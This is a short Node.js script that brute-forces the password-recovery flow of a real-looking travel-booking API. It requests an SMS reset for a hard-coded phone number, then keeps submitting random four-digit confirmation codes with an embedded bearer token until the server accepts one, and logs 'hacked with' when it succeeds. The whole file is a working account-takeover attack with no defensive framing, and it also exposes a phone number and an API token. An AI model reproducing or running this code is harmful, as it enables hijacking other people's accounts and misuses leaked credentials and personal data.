const express = require('express')
const app = express()
const request = require('request')
const randomize = require('randomatic')
const phone = '+7 (707) 817 65 75'


// const bruteforce = setInterval( _ => {
//     if(hacked) {
//         clearInterval(bruteforce)
//     } else {
//         logon()
//     }
// }, 600000)

const recovery = () => {
    request({
        method: 'POST',
        url: 'https://api.aviataproject.com/auth/users/password-recovery',
        form: {
            phone: phone
        },
        headers: {
            'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJmNDlhZjU4Zi1jOTFmLTQ3ZGMtYWEzZi02OGIyNGY0OWFhNmQiLCJpc3MiOiJjNTg4OTNhMmVjZWQ0MTZlYTYwZDFmZTBlNTRhNTczMSIsImlhdCI6MTUyMDc1NTU0MiwiZXhwIjoyODQ1MjY3NTQyLCJjb25zdW1lciI6eyJpZCI6IjZmNTIxMmIwLWRlODMtNGE5Zi1hZjhhLTkxMmU1YmY5MDAyZiIsIm5hbWUiOiJhdmlhdGEua3oud2ViLmRlc2t0b3AifX0.QCfxPWnlHtdM9m0P-1BheSW7Lk-CqL8yhxT_exEmOMQ'
        }
    }, (err, res, body) => {
        console.log(body)
        confirm(randomize('0',4))
    })
}

recovery()



const confirm = (code) => {

    request.post({
        url: 'https://api.aviataproject.com/auth/users/password-recovery/sms-confirmation',
        form: {
            phone: phone,
            code: code
        },
        headers: {
            'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJmNDlhZjU4Zi1jOTFmLTQ3ZGMtYWEzZi02OGIyNGY0OWFhNmQiLCJpc3MiOiJjNTg4OTNhMmVjZWQ0MTZlYTYwZDFmZTBlNTRhNTczMSIsImlhdCI6MTUyMDc1NTU0MiwiZXhwIjoyODQ1MjY3NTQyLCJjb25zdW1lciI6eyJpZCI6IjZmNTIxMmIwLWRlODMtNGE5Zi1hZjhhLTkxMmU1YmY5MDAyZiIsIm5hbWUiOiJhdmlhdGEua3oud2ViLmRlc2t0b3AifX0.QCfxPWnlHtdM9m0P-1BheSW7Lk-CqL8yhxT_exEmOMQ'
        }
    }, (err, res, body) => {

        if (res.statusCode == 400) {
            console.log(code)
            confirm(randomize('0',4))
        } else if (res.statusCode == 200){
            console.log('hacked with ', code, body)
        }
    })
}

// confirm(randomize('0',4))
// confirm(1370)

app.listen(3001)